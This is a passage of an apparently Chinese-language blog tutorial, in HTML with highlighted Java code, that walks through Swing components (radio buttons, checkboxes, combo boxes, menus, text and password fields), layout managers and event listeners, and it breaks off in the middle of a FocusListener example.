title=\"单选按钮组件JRadioButton\"></a>单选按钮组件JRadioButton</h5><p>JRadioButton构造方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">以下参数都可以省略,一般只用指定文字即可</span><br><span class=\"line\">JRadioButton(String text,Icon icon,<span class=\"keyword\">boolean</span> selected)<span class=\"comment\">//指定文字,图标,是否选中</span></span><br></pre></td></tr></table></figure>\n\n<p>例子</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.swing.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.awt.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">jFrameTest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        JFrame jf=<span class=\"keyword\">new</span> JFrame();</span><br><span class=\"line\">        jf.setBounds(<span class=\"number\">400</span>,<span class=\"number\">300</span>,<span class=\"number\">400</span>,<span class=\"number\">250</span>);</span><br><span class=\"line\">        jf.setLayout(<span class=\"keyword\">new</span> FlowLayout());</span><br><span class=\"line\">        jf.setTitle(<span class=\"string\">&quot;hello&quot;</span>);<span class=\"comment\">//设置标题</span></span><br><span class=\"line\">        JRadioButton jrb1=<span class=\"keyword\">new</span> JRadioButton(<span class=\"string\">&quot;男&quot;</span>);</span><br><span class=\"line\">        JRadioButton jrb2=<span class=\"keyword\">new</span> JRadioButton(<span class=\"string\">&quot;女&quot;</span>);</span><br><span class=\"line\">        ButtonGroup group=<span class=\"keyword\">new</span> ButtonGroup();</span><br><span class=\"line\">        group.add(jrb1);</span><br><span class=\"line\">        group.add(jrb2);</span><br><span class=\"line\">        jf.add(jrb1);</span><br><span class=\"line\">        jf.add(jrb2);</span><br><span class=\"line\">        jf.setVisible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<img src=\"/images/java-ui/image-20211228001003287.png\" alt=\"image-20211228001003287\" style=\"zoom:67%;\" />\n\n<h5 id=\"复选框组件JCheckBox\"><a href=\"#复选框组件JCheckBox\" class=\"headerlink\" title=\"复选框组件JCheckBox\"></a>复选框组件JCheckBox</h5><p>JCheckBox构造方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JCheckBox(Icon icon,<span class=\"keyword\">boolean</span> checked);<span class=\"comment\">//指定图标,是否被选中</span></span><br><span class=\"line\">JCheckBox(String text,<span class=\"keyword\">boolean</span> checked);<span class=\"comment\">//指定文字,是否被选中</span></span><br></pre></td></tr></table></figure>\n\n<p>例子</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.swing.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.awt.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">jFrameTest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        JFrame jf=<span class=\"keyword\">new</span> JFrame();</span><br><span class=\"line\">        jf.setBounds(<span class=\"number\">400</span>,<span class=\"number\">300</span>,<span class=\"number\">400</span>,<span class=\"number\">250</span>);</span><br><span class=\"line\">        jf.setLayout(<span class=\"keyword\">new</span> FlowLayout());<span class=\"comment\">//设置流式布局</span></span><br><span class=\"line\">        jf.setTitle(<span class=\"string\">&quot;hello&quot;</span>);<span class=\"comment\">//设置标题</span></span><br><span class=\"line\">        JCheckBox jcb1=<span class=\"keyword\">new</span> JCheckBox(<span class=\"string\">&quot;摆烂&quot;</span>,<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        JCheckBox jcb2=<span class=\"keyword\">new</span> JCheckBox(<span class=\"string\">&quot;足球&quot;</span>);</span><br><span class=\"line\">        JCheckBox jcb3=<span class=\"keyword\">new</span> JCheckBox(<span class=\"string\">&quot;音乐&quot;</span>);</span><br><span class=\"line\">        JCheckBox jcb4=<span class=\"keyword\">new</span> JCheckBox(<span class=\"string\">&quot;睡觉&quot;</span>);</span><br><span class=\"line\">        jf.add(jcb1);</span><br><span class=\"line\">        jf.add(jcb2);</span><br><span class=\"line\">        jf.add(jcb3);</span><br><span class=\"line\">        jf.add(jcb4);</span><br><span class=\"line\">        </span><br><span class=\"line\">        jf.setVisible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<img src=\"/images/java-ui/image-20211228001621601.png\" alt=\"image-20211228001621601\" style=\"zoom:67%;\" />\n\n<h5 id=\"下拉列表组件JComboBox\"><a href=\"#下拉列表组件JComboBox\" class=\"headerlink\" title=\"下拉列表组件JComboBox\"></a>下拉列表组件JComboBox</h5><p>JComboBox构造方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JComboBox();<span class=\"comment\">//常用</span></span><br><span class=\"line\">JComboBox(ComboBoxModel dataModel);<span class=\"comment\">//使用listModel建立一个下拉列表</span></span><br><span class=\"line\">JComBox(Object[] arrayData);</span><br><span class=\"line\">JComboBox(Vector vector);</span><br></pre></td></tr></table></figure>\n\n<p>方法</p>\n<p><code>addItem添加下拉内容</code></p>\n<p>例子</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.swing.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.awt.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">jFrameTest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        JFrame jf=<span class=\"keyword\">new</span> JFrame();</span><br><span class=\"line\">        jf.setBounds(<span class=\"number\">400</span>,<span class=\"number\">300</span>,<span class=\"number\">400</span>,<span class=\"number\">250</span>);</span><br><span class=\"line\">        jf.setLayout(<span class=\"keyword\">new</span> FlowLayout());<span class=\"comment\">//设置流式布局</span></span><br><span class=\"line\">        jf.setTitle(<span class=\"string\">&quot;hello&quot;</span>);<span class=\"comment\">//设置标题</span></span><br><span class=\"line\">        JComboBox box=<span class=\"keyword\">new</span> JComboBox();</span><br><span class=\"line\">        box.addItem(<span class=\"string\">&quot;---请选择你的学历---&quot;</span>);</span><br><span class=\"line\">        box.addItem(<span class=\"string\">&quot;高中&quot;</span>);</span><br><span class=\"line\">        box.addItem(<span class=\"string\">&quot;大学&quot;</span>);</span><br><span class=\"line\">        box.addItem(<span class=\"string\">&quot;研究生&quot;</span>);</span><br><span class=\"line\">        jf.add(box);</span><br><span class=\"line\">        jf.setVisible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<img src=\"/images/java-ui/image-20211228131636660.png\" alt=\"image-20211228131636660\" style=\"zoom:67%;\" />\n\n<h5 id=\"菜单栏组件\"><a href=\"#菜单栏组件\" class=\"headerlink\" title=\"菜单栏组件\"></a>菜单栏组件</h5><p>JmenuBar  Jmenu  JmenuItem</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.swing.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.awt.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">S9_3</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        JFrame jFrame=<span class=\"keyword\">new</span> JFrame(<span class=\"string\">&quot;记事本&quot;</span>);</span><br><span class=\"line\">        jFrame.setBounds(<span class=\"number\">500</span>,<span class=\"number\">400</span>,<span class=\"number\">700</span>,<span class=\"number\">700</span>);</span><br><span class=\"line\">        jFrame.setLayout(<span class=\"keyword\">new</span> FlowLayout(FlowLayout.LEFT));</span><br><span class=\"line\">        JMenuBar bar=<span class=\"keyword\">new</span> JMenuBar();</span><br><span class=\"line\">        JMenu menu1=<span class=\"keyword\">new</span> JMenu(<span class=\"string\">&quot;文件(F)&quot;</span>);</span><br><span class=\"line\">        JMenuItem item1=<span class=\"keyword\">new</span> JMenuItem(<span class=\"string\">&quot;新建&quot;</span>);</span><br><span class=\"line\">        JMenuItem item2=<span class=\"keyword\">new</span> JMenuItem(<span class=\"string\">&quot;保存&quot;</span>);</span><br><span class=\"line\">        JMenuItem item3=<span class=\"keyword\">new</span> JMenuItem(<span class=\"string\">&quot;另存为&quot;</span>);</span><br><span class=\"line\">        menu1.add(item1);</span><br><span class=\"line\">        menu1.add(item2);</span><br><span class=\"line\">        menu1.add(item3);</span><br><span class=\"line\">        JMenu menu2=<span class=\"keyword\">new</span> JMenu(<span class=\"string\">&quot;编辑(E)&quot;</span>);</span><br><span class=\"line\">        JMenu menu3=<span class=\"keyword\">new</span> JMenu(<span class=\"string\">&quot;格式(O)&quot;</span>);</span><br><span class=\"line\">        JMenu menu4=<span class=\"keyword\">new</span> JMenu(<span class=\"string\">&quot;查看(V)&quot;</span>);</span><br><span class=\"line\">        JMenu menu5=<span class=\"keyword\">new</span> JMenu(<span class=\"string\">&quot;帮助(H)&quot;</span>);</span><br><span class=\"line\">        JMenuItem item4=<span class=\"keyword\">new</span> JMenuItem(<span class=\"string\">&quot;查看帮助(H)&quot;</span>);</span><br><span class=\"line\">        JMenuItem item5=<span class=\"keyword\">new</span> JMenuItem(<span class=\"string\">&quot;发送反馈(F)&quot;</span>);</span><br><span class=\"line\">        JMenuItem item6=<span class=\"keyword\">new</span> JMenuItem(<span class=\"string\">&quot;关于记事本(A)&quot;</span>);</span><br><span class=\"line\">        menu5.add(item4);</span><br><span class=\"line\">        menu5.add(item5);</span><br><span class=\"line\">        menu5.add(item6);</span><br><span class=\"line\">        bar.add(menu1);</span><br><span class=\"line\">        bar.add(menu2);</span><br><span class=\"line\">        bar.add(menu3);</span><br><span class=\"line\">        bar.add(menu4);</span><br><span class=\"line\">        bar.add(menu5);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        jFrame.add(bar);</span><br><span class=\"line\">        JTextArea jTextArea=<span class=\"keyword\">new</span> JTextArea(<span class=\"number\">40</span>,<span class=\"number\">63</span>);</span><br><span class=\"line\">        jFrame.add(jTextArea);</span><br><span class=\"line\">        jFrame.setVisible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        jFrame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<img src=\"/images/java-ui/image-20211229002557142.png\" alt=\"image-20211229002557142\" style=\"zoom:67%;\" />\n\n<h5 id=\"文本组件JTextField\"><a href=\"#文本组件JTextField\" class=\"headerlink\" title=\"文本组件JTextField\"></a>文本组件JTextField</h5><p>构造方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">以下参数都可以省略,一般只用指定文字即可</span><br><span class=\"line\">JTextField(Document docModel,String text,<span class=\"keyword\">int</span> fieldWidth);<span class=\"comment\">//指定文本框,文字,文本框长度</span></span><br></pre></td></tr></table></figure>\n\n<p><code>getText();//获取输入的内容</code></p>\n<h5 id=\"密码框组件JPasswordField\"><a href=\"#密码框组件JPasswordField\" class=\"headerlink\" title=\"密码框组件JPasswordField\"></a>密码框组件JPasswordField</h5><p>构造方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">以下参数都可以省略,一般只用指定文字即可</span><br><span class=\"line\">JPasswordField(Document docModel,String text,<span class=\"keyword\">int</span> fieldWidth);<span class=\"comment\">//指定文本框,文字,文本框长度</span></span><br></pre></td></tr></table></figure>\n\n<p>常用方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setEchoChar(<span class=\"string\">&#x27;*&#x27;</span>);<span class=\"comment\">//设置回显字符</span></span><br><span class=\"line\">getText();<span class=\"comment\">//获取输入的内容</span></span><br></pre></td></tr></table></figure>\n\n<p>例子</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.swing.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.awt.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">jFrameTest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        JFrame jf=<span class=\"keyword\">new</span> JFrame();</span><br><span class=\"line\">        jf.setBounds(<span class=\"number\">400</span>,<span class=\"number\">300</span>,<span class=\"number\">400</span>,<span class=\"number\">250</span>);</span><br><span class=\"line\">        jf.setLayout(<span class=\"keyword\">new</span> FlowLayout(FlowLayout.LEFT));<span class=\"comment\">//设置流式布局</span></span><br><span class=\"line\">        jf.setTitle(<span class=\"string\">&quot;hello&quot;</span>);<span class=\"comment\">//设置标题</span></span><br><span class=\"line\">        JLabel jlabel1=<span class=\"keyword\">new</span> JLabel(<span class=\"string\">&quot;账号:&quot;</span>);</span><br><span class=\"line\">        JTextField username=<span class=\"keyword\">new</span> JTextField(<span class=\"number\">10</span>);</span><br><span class=\"line\">        jf.add(jlabel1);</span><br><span class=\"line\">        jf.add(username);</span><br><span class=\"line\">        JLabel jlabel2=<span class=\"keyword\">new</span> JLabel(<span class=\"string\">&quot;密码:&quot;</span>);</span><br><span class=\"line\">        JPasswordField password=<span class=\"keyword\">new</span> JPasswordField(<span class=\"number\">10</span>);</span><br><span class=\"line\">        password.setEchoChar(<span class=\"string\">&#x27;*&#x27;</span>);<span class=\"comment\">//设置回显字符</span></span><br><span class=\"line\"></span><br><span class=\"line\">        jf.add(jlabel2);</span><br><span class=\"line\"></span><br><span class=\"line\">        jf.add(password);</span><br><span class=\"line\"></span><br><span class=\"line\">        jf.setVisible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<img src=\"/images/java-ui/image-20211228133823317.png\" alt=\"image-20211228133823317\" style=\"zoom:67%;\" />\n\n<h5 id=\"文本域组件JTextArea\"><a href=\"#文本域组件JTextArea\" class=\"headerlink\" title=\"文本域组件JTextArea\"></a>文本域组件JTextArea</h5><p>构造函数</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JTextArea(Document doc,String text,<span class=\"keyword\">int</span> rows,<span class=\"keyword\">int</span> cols);<span class=\"comment\">//指定文本模型,默认文字,长,宽</span></span><br></pre></td></tr></table></figure>\n\n<p>常用方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setLineWrap();<span class=\"comment\">//设置文本域是否自动换行true or false</span></span><br><span class=\"line\">getText();<span class=\"comment\">//获取输入的内容</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"常用布局\"><a href=\"#常用布局\" class=\"headerlink\" title=\"常用布局\"></a>常用布局</h4><h5 id=\"流布局FlowLayout\"><a href=\"#流布局FlowLayout\" class=\"headerlink\" title=\"流布局FlowLayout\"></a>流布局FlowLayout</h5><p>所有组件像流一样,一个一个排放,排满一行之后排下一行,默认情况下,每个组件是居中排列的,但是也可以设置</p>\n<p>构造方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//参数都可省略,一般只写对齐方式</span></span><br><span class=\"line\">FlowLayout(<span class=\"keyword\">int</span> aligment,<span class=\"keyword\">int</span> horizGap,<span class=\"keyword\">int</span> vertGap);<span class=\"comment\">//设置对齐方式,上下偏移</span></span><br><span class=\"line\">aligment取值:</span><br><span class=\"line\">FlowLayout.LEFT=<span class=\"number\">0</span>;</span><br><span class=\"line\">FlowLayout.CENTER=<span class=\"number\">1</span>;</span><br><span class=\"line\">FlowLayout.RIGHT=<span class=\"number\">2</span>;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"边界布局BorderLayout\"><a href=\"#边界布局BorderLayout\" class=\"headerlink\" title=\"边界布局BorderLayout\"></a>边界布局BorderLayout</h5><p>边界布局是默认的布局管理方式,边界布局将容器分成了东<code>BorderLayout.NORTH</code>,南,西,北,中5个区域</p>\n<p>在add的时候指定边界</p>\n<p><code>jf.add(button,BorderLayout.NORTH);</code></p>\n<img src=\"/images/java-ui/image-20211228135034235.png\" alt=\"image-20211228135034235\" style=\"zoom:67%;\" />\n\n<h5 id=\"网格布局GridLayout\"><a href=\"#网格布局GridLayout\" class=\"headerlink\" title=\"网格布局GridLayout\"></a>网格布局GridLayout</h5><p>将容器划分为网格,网格个数由行和列决定,每个组件会填满空格,改变容器大小,组件的大小也会随之改变</p>\n<p>构造方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GridLayout(<span class=\"keyword\">int</span> rows,<span class=\"keyword\">int</span> columns,<span class=\"keyword\">int</span> horizGap,<span class=\"keyword\">int</span> vertGap);<span class=\"comment\">//指定行数,列数,水平间隔.垂直间隔</span></span><br></pre></td></tr></table></figure>\n\n<p>例子</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.swing.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.awt.*;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">jFrameTest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        JFrame jf=<span class=\"keyword\">new</span> JFrame();</span><br><span class=\"line\">        jf.setBounds(<span class=\"number\">400</span>,<span class=\"number\">300</span>,<span class=\"number\">400</span>,<span class=\"number\">250</span>);</span><br><span class=\"line\">        jf.setLayout(<span class=\"keyword\">new</span> GridLayout(<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">5</span>));<span class=\"comment\">//设置网格布局</span></span><br><span class=\"line\">        jf.setTitle(<span class=\"string\">&quot;test&quot;</span>);<span class=\"comment\">//设置标题</span></span><br><span class=\"line\">        JButton jButton1=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;A&quot;</span>);</span><br><span class=\"line\">        JButton jButton2=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;B&quot;</span>);</span><br><span class=\"line\">        JButton jButton3=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;C&quot;</span>);</span><br><span class=\"line\">        JButton jButton4=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;D&quot;</span>);</span><br><span class=\"line\">        JButton jButton5=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;E&quot;</span>);</span><br><span class=\"line\">        JButton jButton6=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;F&quot;</span>);</span><br><span class=\"line\">        JButton jButton7=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;G&quot;</span>);</span><br><span class=\"line\">        JButton jButton8=<span class=\"keyword\">new</span> JButton(<span class=\"string\">&quot;H&quot;</span>);</span><br><span class=\"line\">        jf.add(jButton1);</span><br><span class=\"line\">        jf.add(jButton2);</span><br><span class=\"line\">        jf.add(jButton3);</span><br><span class=\"line\">        jf.add(jButton4);</span><br><span class=\"line\">        jf.add(jButton5);</span><br><span class=\"line\">        jf.add(jButton6);</span><br><span class=\"line\">        jf.add(jButton7);</span><br><span class=\"line\">        jf.add(jButton8);</span><br><span class=\"line\">        jf.setVisible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<img src=\"/images/java-ui/image-20211228135556932.png\" alt=\"image-20211228135556932\" style=\"zoom:67%;\" />\n\n<h4 id=\"常用的事件监听器\"><a href=\"#常用的事件监听器\" class=\"headerlink\" title=\"常用的事件监听器\"></a>常用的事件监听器</h4><p>一个事件模型中有三个对象:事件源,事件,以及监听程序</p>\n<h5 id=\"事件监听机制\"><a href=\"#事件监听机制\" class=\"headerlink\" title=\"事件监听机制\"></a>事件监听机制</h5><ul>\n<li>事件源    事件发生的地方</li>\n<li>事件        要发生的事情</li>\n<li>事件处理 针对发生的事情做出的处理方案</li>\n<li>事件监听 把事件源和事件关联起来</li>\n</ul>\n<h5 id=\"两种监听器\"><a href=\"#两种监听器\" class=\"headerlink\" title=\"两种监听器\"></a>两种监听器</h5><table>\n<thead>\n<tr>\n<th></th>\n<th>事件</th>\n<th>事件源</th>\n<th>监听接口</th>\n<th>方法</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>动作事件监听器</td>\n<td>ActionEvent</td>\n<td>JButton,JlistmJTextField等</td>\n<td>ActionListener</td>\n<td>addActionListener(),removeActionListener()</td>\n</tr>\n<tr>\n<td>焦点事件监听器</td>\n<td>FocusEvent</td>\n<td>Component及其派生</td>\n<td>FocusListener</td>\n<td>addFocusListener(),removeFocusListener()</td>\n</tr>\n</tbody></table>\n<p>使用步骤</p>\n<ol>\n<li>新建一个组件(如Button)</li>\n<li>将该组件添加到相应的面板(如JFrame)</li>\n<li>注册监听器以监听事件源产生的事件(如通过ActionListener来响应用户点击按钮)</li>\n<li>定义处理事件的方法(如在ActionListener中的actionPerformed中定义响应的方法)</li>\n</ol>\n<p><strong>一般用匿名内部类方式实现</strong></p>\n<p>例子</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jla.addFocusListener(<span class=\"keyword\">new</span> FocusListener()&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">focusLost</span><span class=\"params\">(FocusEvent e)</span></span>&#123;</span><br><span class=\"line\">        <span 